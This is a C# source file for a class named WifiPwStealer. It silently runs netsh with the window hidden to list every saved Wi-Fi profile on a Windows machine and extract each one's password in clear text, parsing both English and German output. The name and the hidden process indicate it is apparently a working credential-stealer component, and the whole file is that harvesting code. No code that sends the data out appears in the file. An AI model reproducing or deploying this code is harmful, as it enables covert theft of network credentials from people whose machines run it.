using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Wifi_PWS
{
    public class WifiPwStealer
    {
        /// <summary>
        /// Get a list of all saved Wifi network names and their passwords.
        /// </summary>
        /// <returns>A string of all saved Wifi network names and their passwords</returns>
        public static string GetAllWifiPw()
        {
            try
            {
                StringBuilder allWifiResults = new StringBuilder();
                foreach (string profileName in ListAllSavedWifi())
                    allWifiResults.Append(GetSingleWifiPw(profileName));
                return allWifiResults.ToString();
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        /// <summary>
        /// Get specific Wifi network name and its password
        /// </summary>
        /// <param name="profileName">The name of the Wifi</param>
        /// <returns>A string of specific Wifi network name and its password</returns>
        public static string GetSingleWifiPw(string profileName)
        {
            try
            {
                string result = $"Network Name: {profileName}\n";

                // Escape # for netsh, otherwise it wont show any password
                profileName = profileName.Replace("#", "*#");

                var processStartInfo = new ProcessStartInfo
                {
                    FileName = "netsh",
                    Arguments = $"wlan show profile name=\"{profileName}\" key=clear",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(processStartInfo))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    string passwordLine = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                        .FirstOrDefault(line => line.Contains("Key Content") || line.Contains("Schlüsselinhalt"));

                    if (!string.IsNullOrEmpty(passwordLine) && passwordLine.Contains(":"))
                        result += $"Password: {passwordLine.Split(':').Last().Trim()}\n\n";
                    else
                    {
                        string authLine = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                        .FirstOrDefault(line => line.Contains("Authentication") || line.Contains("Authentifizierung"));

                        if (!string.IsNullOrEmpty(authLine) && authLine.Contains(":"))
                            result += $"Authentication: {authLine.Split(':').Last().Trim()}\n\n";
                        else
                            result += $"Warning: No password and authentication found!\n\n";
                    }
                }

                return result;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        /// <summary>
        /// Lists all saved Wifi
        /// </summary>
        /// <returns>A string array of all saved Wifi</returns>
        public static string[] ListAllSavedWifi()
        {
            List<string> profileNames = new List<string>();
            try
            {
                var processStartInfo = new ProcessStartInfo
                {
                    FileName = "netsh",
                    Arguments = "wlan show profiles",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(processStartInfo))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    var lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (var line in lines)
                    {
                        if (line.Contains(" : "))
                        {
                            string profileName = line.Split(':').Last().Trim();
                            profileNames.Add(profileName);
                        }
                    }

                    return profileNames.ToArray();
                }
            }
            catch (Exception ex)
            {
                profileNames.Add(ex.Message);
                return profileNames.ToArray();
            }
        }
    }
}
